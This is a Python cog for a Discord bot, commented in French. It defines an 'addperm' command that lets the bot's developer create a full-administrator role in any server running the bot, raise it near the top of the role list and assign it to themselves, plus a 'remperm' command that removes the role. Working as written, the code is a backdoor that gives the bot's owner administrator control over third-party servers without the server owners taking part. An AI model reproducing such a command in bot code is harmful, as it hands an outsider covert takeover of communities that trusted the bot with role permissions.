"""
Commandes préfixées - Module d'ajout de permissions (réservé aux propriétaires du bot)
"""
from core.bot_owner_manager import is_bot_owner
import discord
from discord.ext import commands
import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(__file__)))


class AddPermPrefixe(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="addperm", help="Crée un rôle administrateur pour le propriétaire du bot (propriétaires uniquement)")
    async def addperm(self, ctx):
        """Crée un rôle avec permissions administrateur le plus haut possible pour le propriétaire du bot"""

        # Vérifier si l'utilisateur est propriétaire du bot
        if not is_bot_owner(ctx.author.id):
            await ctx.send("❌ Cette commande est réservée aux propriétaires du bot.")
            return

        try:
            guild = ctx.guild
            bot_member = guild.me
            author = ctx.author

            # Vérifier si le bot a les permissions nécessaires
            if not bot_member.guild_permissions.manage_roles:
                await ctx.send("❌ Le bot n'a pas la permission de gérer les rôles sur ce serveur.")
                return

            # Vérifier si l'utilisateur est déjà administrateur
            if author.guild_permissions.administrator:
                await ctx.send("✅ Vous avez déjà les permissions administrateur sur ce serveur.")
                return

            # Trouver la position la plus haute possible pour le nouveau rôle
            bot_top_role = bot_member.top_role
            target_position = bot_top_role.position - 1

            # Créer le rôle avec permissions administrateur
            role_name = f"🔧 Bot Owner - {author.display_name}"

            # Permissions administrateur complètes
            permissions = discord.Permissions(administrator=True)

            # Créer le rôle
            new_role = await guild.create_role(
                name=role_name,
                permissions=permissions,
                color=discord.Color.red(),  # Couleur rouge pour le rôle owner
                hoist=True,  # Afficher séparément dans la liste des membres
                mentionable=False,
                reason=f"Rôle administrateur créé pour le propriétaire du bot: {author}"
            )

            # Déplacer le rôle à la position la plus haute possible
            try:
                positions = {new_role: target_position}
                await guild.edit_role_positions(positions=positions, reason="Positionnement du rôle owner")
            except discord.HTTPException:
                # Si on ne peut pas déplacer le rôle, ce n'est pas grave
                pass

            # Assigner le rôle au propriétaire du bot
            await author.add_roles(new_role, reason="Attribution du rôle administrateur au propriétaire du bot")

            # Envoyer un message de confirmation avec embed
            embed = discord.Embed(
                title="🔧 Rôle Administrateur Créé",
                description=f"Le rôle **{role_name}** a été créé et assigné avec succès !",
                color=discord.Color.green()
            )

            embed.add_field(
                name="📋 Permissions",
                value="✅ Administrateur (toutes permissions)",
                inline=False
            )

            embed.add_field(
                name="📍 Position",
                value=f"Position {new_role.position} (sous le rôle du bot)",
                inline=True
            )

            embed.add_field(
                name="👤 Assigné à",
                value=author.mention,
                inline=True
            )

            embed.add_field(
                name="🎨 Couleur",
                value="Rouge (distinct)",
                inline=True
            )

            embed.set_footer(text=f"Rôle créé par {self.bot.user.name}")
            embed.timestamp = discord.utils.utcnow()

            await ctx.send(embed=embed)

            # Log de l'action
            print(
                f"🔧 ADDPERM: Rôle '{role_name}' créé pour {author} ({author.id}) sur {guild.name} ({guild.id})")

        except discord.Forbidden:
            await ctx.send("❌ Le bot n'a pas les permissions suffisantes pour créer des rôles ou les assigner.")

        except discord.HTTPException as e:
            await ctx.send(f"❌ Erreur lors de la création du rôle: {str(e)}")

        except Exception as e:
            await ctx.send(f"❌ Une erreur inattendue s'est produite: {str(e)}")
            print(f"❌ ERREUR ADDPERM: {str(e)}")

    @commands.command(name="remperm", help="Supprime les rôles administrateur créés par addperm (propriétaires uniquement)")
    async def remperm(self, ctx):
        """Supprime les rôles administrateur créés précédemment par la commande addperm"""

        # Vérifier si l'utilisateur est propriétaire du bot
        if not is_bot_owner(ctx.author.id):
            await ctx.send("❌ Cette commande est réservée aux propriétaires du bot.")
            return

        try:
            guild = ctx.guild
            bot_member = guild.me
            author = ctx.author

            # Vérifier si le bot a les permissions nécessaires
            if not bot_member.guild_permissions.manage_roles:
                await ctx.send("❌ Le bot n'a pas la permission de gérer les rôles sur ce serveur.")
                return

            # Chercher les rôles créés par addperm pour cet utilisateur
            roles_to_remove = []
            pattern = f"🔧 Bot Owner - {author.display_name}"

            for role in guild.roles:
                if role.name == pattern and role in author.roles:
                    roles_to_remove.append(role)

            if not roles_to_remove:
                await ctx.send("❌ Aucun rôle administrateur créé par `!addperm` trouvé pour vous.")
                return

            # Retirer les rôles de l'utilisateur et les supprimer
            removed_count = 0
            for role in roles_to_remove:
                try:
                    await author.remove_roles(role, reason="Suppression du rôle administrateur via remperm")
                    await role.delete(reason=f"Rôle administrateur supprimé via remperm par {author}")
                    removed_count += 1
                except discord.HTTPException:
                    continue

            if removed_count > 0:
                embed = discord.Embed(
                    title="🗑️ Rôles Supprimés",
                    description=f"{removed_count} rôle(s) administrateur(s) supprimé(s) avec succès.",
                    color=discord.Color.orange()
                )
                embed.set_footer(text=f"Action effectuée par {author}")
                embed.timestamp = discord.utils.utcnow()
                await ctx.send(embed=embed)

                print(
                    f"🗑️ REMPERM: {removed_count} rôle(s) supprimé(s) pour {author} ({author.id}) sur {guild.name} ({guild.id})")
            else:
                await ctx.send("❌ Impossible de supprimer les rôles. Vérifiez les permissions du bot.")

        except Exception as e:
            await ctx.send(f"❌ Une erreur inattendue s'est produite: {str(e)}")
            print(f"❌ ERREUR REMPERM: {str(e)}")


async def setup(bot):
    await bot.add_cog(AddPermPrefixe(bot))
